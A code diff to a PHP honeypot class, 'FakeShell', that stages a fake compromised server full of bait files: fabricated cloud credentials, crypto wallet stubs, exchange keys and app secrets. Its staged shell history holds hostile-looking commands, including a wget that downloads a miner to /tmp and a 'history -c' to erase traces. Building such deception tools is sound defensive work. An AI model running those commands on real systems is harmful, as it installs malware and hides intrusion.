@@ -19,31 +19,216 @@ final class FakeShell
     private const MAX_OUTPUT = 8192;
     private const HOST = 'web01';
 
-    /** dir path → child entry names */
+    /**
+     * dir path → child entry names. The tree below stages a "juicy" compromised box: crypto
+     * wallets, cloud/devops creds and app .env secrets under /root and /home/ubuntu, so scanners
+     * dig for loot while the listener logs every path they touch. EVERY leaf below is fabricated
+     * and inert (see FILES) — the wiring here only makes them discoverable via `ls`.
+     */
     private const DIRS = [
         '/' => ['bin', 'boot', 'dev', 'etc', 'home', 'lib', 'opt', 'proc', 'root', 'run', 'sbin', 'srv', 'tmp', 'usr', 'var'],
-        '/root' => ['.bash_history', '.bashrc', '.profile', '.ssh', '.cache'],
+        '/root' => ['.aws', '.bash_history', '.bashrc', '.binance', '.cache', '.config', '.docker', '.electrum', '.env', '.ethereum', '.kube', '.mysql_history', '.profile', '.rediscli_history', '.ssh', 'seed.txt', 'wallet.dat'],
         '/root/.ssh' => ['authorized_keys', 'id_rsa', 'id_rsa.pub', 'known_hosts'],
+        '/root/.aws' => ['config', 'credentials'],
+        '/root/.config' => ['gcloud', 'solana'],
+        '/root/.config/gcloud' => ['application_default_credentials.json'],
+        '/root/.config/solana' => ['cli', 'id.json'],
+        '/root/.config/solana/cli' => ['config.yml'],
+        '/root/.docker' => ['config.json'],
+        '/root/.electrum' => ['config', 'wallets'],
+        '/root/.electrum/wallets' => ['default_wallet'],
+        '/root/.ethereum' => ['keystore'],
+        '/root/.ethereum/keystore' => ['UTC--2024-01-15T09-32-14.000000000Z--00000000000000000000000000000000deadbeef'],
+        '/root/.kube' => ['config'],
         '/etc' => ['passwd', 'shadow', 'hostname', 'hosts', 'os-release', 'crontab', 'ssh'],
         '/home' => ['ubuntu', 'deploy'],
-        '/home/ubuntu' => ['.bashrc', '.profile', '.ssh'],
+        '/home/ubuntu' => ['.aws', '.bashrc', '.config', '.env', '.profile', '.ssh', 'wallet.dat'],
+        '/home/ubuntu/.aws' => ['credentials'],
+        '/home/ubuntu/.config' => ['solana'],
+        '/home/ubuntu/.config/solana' => ['cli', 'id.json'],
+        '/home/ubuntu/.config/solana/cli' => ['config.yml'],
+        '/home/ubuntu/.ssh' => ['authorized_keys', 'id_rsa', 'id_rsa.pub'],
         '/var' => ['backups', 'lib', 'log', 'www'],
         '/var/www' => ['html'],
+        '/var/www/html' => ['.env', 'config.php', 'index.php'],
         '/var/backups' => ['db_backup.sql.gz', 'passwd.bak'],
         '/tmp' => [],
     ];
 
-    /** file path → contents (canned, inert) */
+    /**
+     * file path → contents (canned, inert). Nothing here is real: keys use documented AWS example
+     * IDs, `FAKE…`/`deadbeef` placeholders and RFC5737 (198.51.100.0/24) hosts; the Solana keypairs
+     * are constant deadbeef/cafebabe byte patterns; the seed phrase is repeated placeholder words
+     * (never a valid BIP39 mnemonic). No value controls a funded wallet or a live account. `ls -la`
+     * derives each file's reported size from strlen(contents).
+     */
     private const FILES = [
         '/etc/hostname' => "web01\n",
         '/etc/hosts' => "127.0.0.1 localhost\n127.0.1.1 web01\n",
         '/etc/os-release' => "PRETTY_NAME=\"Ubuntu 22.04.3 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"22.04\"\nVERSION=\"22.04.3 LTS (Jammy Jellyfish)\"\nID=ubuntu\n",
         '/root/.bashrc' => "# ~/.bashrc\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nalias ll='ls -alF'\n",
         '/root/.profile' => "# ~/.profile\nmesg n 2> /dev/null || true\n",
-        '/root/.bash_history' => "ls -la\ncat /etc/passwd\nuname -a\nwget http://example.com/setup.sh\nps aux\nnetstat -tulpn\n",
+        // Prime intel bait: a plausible operator history that points at every loot file above.
+        '/root/.bash_history' => "ls -la\n"
+            . "cat /etc/passwd\n"
+            . "uname -a\n"
+            . "solana balance\n"
+            . "solana transfer 9xQeWvGf00000000000000000000000000000000FAKE 12.5 --from ~/.config/solana/id.json --allow-unfunded-recipient\n"
+            . "geth attach /root/.ethereum/geth.ipc\n"
+            . "aws s3 ls s3://prod-backups/\n"
+            . "aws s3 cp s3://prod-backups/db.sql.gz /tmp/\n"
+            . "mysql -u appuser -p'S3cr3t-f4ke-db-p4ss' app_prod\n"
+            . "redis-cli -a FAKEredispass KEYS '*'\n"
+            . "ssh deploy@198.51.100.23\n"
+            . "curl -H 'Authorization: Bearer FAKEapitoken0000000000' https://api.example.com/v1/balances\n"
+            . "wget http://198.51.100.50/miner -O /tmp/kdevtmpfsi\n"
+            . "ps aux\n"
+            . "netstat -tulpn\n"
+            . "history -c\n",
         '/root/.ssh/authorized_keys' => "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7fakekeyfakekeyfakekey root@web01\n",
         '/root/.ssh/id_rsa' => "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA(fake, truncated)\n-----END OPENSSH PRIVATE KEY-----\n",
         '/root/.ssh/known_hosts' => "",
+
+        // --- cloud / devops creds (all fabricated) ---
+        // AKIAIOSFODNN7EXAMPLE + wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY are AWS's own doc examples.
+        '/root/.aws/credentials' => "[default]\n"
+            . "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
+            . "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
+            . "region = us-east-1\n",
+        '/root/.aws/config' => "[default]\nregion = us-east-1\noutput = json\n",
+        '/root/.config/gcloud/application_default_credentials.json' => "{\n"
+            . "  \"client_id\": \"000000000000-fakefakefake.apps.googleusercontent.com\",\n"
+            . "  \"client_secret\": \"FAKE-gcloud-client-secret-000000\",\n"
+            . "  \"refresh_token\": \"1//0fFAKErefreshtokenFAKErefreshtoken000\",\n"
+            . "  \"type\": \"authorized_user\"\n"
+            . "}\n",
+        '/root/.kube/config' => "apiVersion: v1\n"
+            . "kind: Config\n"
+            . "current-context: prod\n"
+            . "clusters:\n"
+            . "- cluster:\n"
+            . "    server: https://198.51.100.10:6443\n"
+            . "    certificate-authority-data: FAKECERTAUTHDATA0000000000000000\n"
+            . "  name: prod-cluster\n"
+            . "contexts:\n"
+            . "- context:\n"
+            . "    cluster: prod-cluster\n"
+            . "    user: admin\n"
+            . "  name: prod\n"
+            . "users:\n"
+            . "- name: admin\n"
+            . "  user:\n"
+            . "    token: FAKE.kube.admin.token.0000000000\n",
+        // "auth" base64-decodes to the fabricated "fakeuser:fakepassword".
+        '/root/.docker/config.json' => "{\n"
+            . "  \"auths\": {\n"
+            . "    \"https://index.docker.io/v1/\": {\n"
+            . "      \"auth\": \"ZmFrZXVzZXI6ZmFrZXBhc3N3b3Jk\"\n"
+            . "    }\n"
+            . "  }\n"
+            . "}\n",
+
+        // --- crypto wallets (all fabricated) ---
+        // Solana keypair = a constant 64-byte deadbeef pattern, not a random funded key.
+        '/root/.config/solana/id.json' => "[222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239]\n",
+        '/root/.config/solana/cli/config.yml' => "---\n"
+            . "json_rpc_url: \"https://api.mainnet-beta.solana.com\"\n"
+            . "websocket_url: \"\"\n"
+            . "keypair_path: /root/.config/solana/id.json\n"
+            . "commitment: confirmed\n",
+        // Web3 v3 keystore with fabricated hex — the ciphertext decrypts to nothing.
+        '/root/.ethereum/keystore/UTC--2024-01-15T09-32-14.000000000Z--00000000000000000000000000000000deadbeef' => "{\"address\":\"00000000000000000000000000000000deadbeef\",\"crypto\":{\"cipher\":\"aes-128-ctr\",\"ciphertext\":\"deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef\",\"cipherparams\":{\"iv\":\"00000000000000000000000000000000\"},\"kdf\":\"scrypt\",\"kdfparams\":{\"dklen\":32,\"n\":262144,\"p\":1,\"r\":8,\"salt\":\"cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe\"},\"mac\":\"0000000000000000000000000000000000000000000000000000000000000000\"},\"id\":\"00000000-0000-0000-0000-0000deadbeef\",\"version\":3}\n",
+        // Repeated placeholder words — deliberately NOT a valid BIP39 mnemonic.
+        '/root/.electrum/wallets/default_wallet' => "{\n"
+            . "  \"wallet_type\": \"standard\",\n"
+            . "  \"use_encryption\": false,\n"
+            . "  \"seed_version\": 18,\n"
+            . "  \"keystore\": {\n"
+            . "    \"type\": \"bip32\",\n"
+            . "    \"seed\": \"gravity gravity gravity ocean ocean ocean marble marble marble sunset sunset sunset\",\n"
+            . "    \"xprv\": \"xprv9s21ZrQH143K3FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE00\",\n"
+            . "    \"xpub\": \"xpub661MyMwAqRbcFFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE00\"\n"
+            . "  }\n"
+            . "}\n",
+        '/root/.electrum/config' => "{\"rpcuser\": \"user\", \"rpcpassword\": \"FAKEelectrumrpc\", \"auto_connect\": true}\n",
+        '/root/seed.txt' => "gravity gravity gravity ocean ocean ocean marble marble marble sunset sunset sunset\n",
+        // Binary-ish Bitcoin Core wallet stub — readable markers, no real WIF key.
+        '/root/wallet.dat' => "\x00\x05b1\x00\tBtree\x00main\x00\bkeymeta1FAKEbtcWa11etAddr000000000000000000\bmkey\x01\x00encrypted-fabricated-no-funds\n",
+
+        // --- exchange API keys (all fabricated) ---
+        '/root/.binance' => "# exchange API credentials\n"
+            . "BINANCE_API_KEY=FAKEbinancekeyFAKEbinancekeyFAKEbinancekeyFAKEbinancekey0000\n"
+            . "BINANCE_API_SECRET=FAKEbinancesecretFAKEbinancesecretFAKEbinancesecret000000\n",
+
+        // --- app secrets (all fabricated) ---
+        '/root/.env' => "APP_ENV=production\n"
+            . "APP_KEY=base64:FAKEappkeyFAKEappkeyFAKEappkeyFAKEappkey00=\n"
+            . "APP_DEBUG=false\n"
+            . "DB_CONNECTION=mysql\n"
+            . "DB_HOST=127.0.0.1\n"
+            . "DB_DATABASE=app_prod\n"
+            . "DB_USERNAME=appuser\n"
+            . "DB_PASSWORD=S3cr3t-f4ke-db-p4ss\n"
+            . "JWT_SECRET=FAKEjwtsecret00000000000000000000000000\n"
+            . "STRIPE_SECRET=sk_live_FAKEstripe000000000000000000\n"
+            . "SENDGRID_API_KEY=SG.FAKEsendgrid00000.0000000000000000000000000000000000000000000\n"
+            . "ETH_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/FAKEALCHEMYKEY000000000000000\n"
+            . "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
+            . "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n",
+        '/root/.mysql_history' => "show databases;\n"
+            . "use app_prod;\n"
+            . "select user,authentication_string from mysql.user;\n"
+            . "select id,email,balance from wallets order by balance desc limit 10;\n"
+            . "update users set is_admin=1 where email='ops@example.com';\n"
+            . "\\q\n",
+        '/root/.rediscli_history' => "AUTH FAKEredispass\n"
+            . "KEYS *\n"
+            . "GET session:admin\n"
+            . "CONFIG GET dir\n"
+            . "SMEMBERS wallets:hot\n"
+            . "SAVE\n",
+
+        // --- /home/ubuntu: a second, lighter loot spread (all fabricated) ---
+        '/home/ubuntu/.aws/credentials' => "[default]\n"
+            . "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
+            . "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n",
+        // Distinct fabricated Solana keypair — a constant cafebabe byte pattern.
+        '/home/ubuntu/.config/solana/id.json' => "[202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190]\n",
+        '/home/ubuntu/.config/solana/cli/config.yml' => "---\n"
+            . "json_rpc_url: \"https://api.mainnet-beta.solana.com\"\n"
+            . "websocket_url: \"\"\n"
+            . "keypair_path: /home/ubuntu/.config/solana/id.json\n"
+            . "commitment: confirmed\n",
+        '/home/ubuntu/.env' => "APP_ENV=production\n"
+            . "DB_HOST=127.0.0.1\n"
+            . "DB_DATABASE=app_prod\n"
+            . "DB_USERNAME=appuser\n"
+            . "DB_PASSWORD=S3cr3t-f4ke-db-p4ss\n"
+            . "STRIPE_SECRET=sk_live_FAKEstripe000000000000000000\n",
+        '/home/ubuntu/.ssh/authorized_keys' => "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7fakekeyfakekeyfakekey deploy@web01\n",
+        '/home/ubuntu/.ssh/id_rsa' => "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA(fake, truncated)\n-----END OPENSSH PRIVATE KEY-----\n",
+        '/home/ubuntu/.ssh/id_rsa.pub' => "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7fakekeyfakekeyfakekey ubuntu@web01\n",
+        '/home/ubuntu/wallet.dat' => "\x00\x05b1\x00\tBtree\x00main\x00\bkeymeta1FAKEbtcWa11etAddr111111111111111111\bmkey\x01\x00encrypted-fabricated-no-funds\n",
+
+        // --- /var/www/html: web app secrets (all fabricated) ---
+        '/var/www/html/.env' => "APP_ENV=production\n"
+            . "APP_KEY=base64:FAKEappkeyFAKEappkeyFAKEappkeyFAKEappkey00=\n"
+            . "DB_CONNECTION=mysql\n"
+            . "DB_HOST=127.0.0.1\n"
+            . "DB_DATABASE=app_prod\n"
+            . "DB_USERNAME=appuser\n"
+            . "DB_PASSWORD=S3cr3t-f4ke-db-p4ss\n"
+            . "REDIS_PASSWORD=FAKEredispass\n"
+            . "JWT_SECRET=FAKEjwtsecret00000000000000000000000000\n"
+            . "STRIPE_SECRET=sk_live_FAKEstripe000000000000000000\n"
+            . "ETH_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/FAKEALCHEMYKEY000000000000000\n",
+        '/var/www/html/config.php' => "<?php\n"
+            . "// legacy DB config\n"
+            . "\$db_host = '127.0.0.1';\n"
+            . "\$db_user = 'appuser';\n"
+            . "\$db_pass = 'S3cr3t-f4ke-db-p4ss';\n"
+            . "\$db_name = 'app_prod';\n",
+        '/var/www/html/index.php' => "<?php\nrequire __DIR__ . '/config.php';\necho 'OK';\n",
     ];
 
     /**
@@ -302,6 +487,10 @@ final class FakeShell
     {
         if ($path === '' || $path === '~') {
             return '/root';
+        }
+        // `~/…` → /root/… — the session is root, and attackers reach for the loot files by tilde.
+        if (strncmp($path, '~/', 2) === 0) {
+            $path = '/root/' . substr($path, 2);
         }
         if ($path[0] !== '/') {
             $path = rtrim($cwd, '/') . '/' . $path;
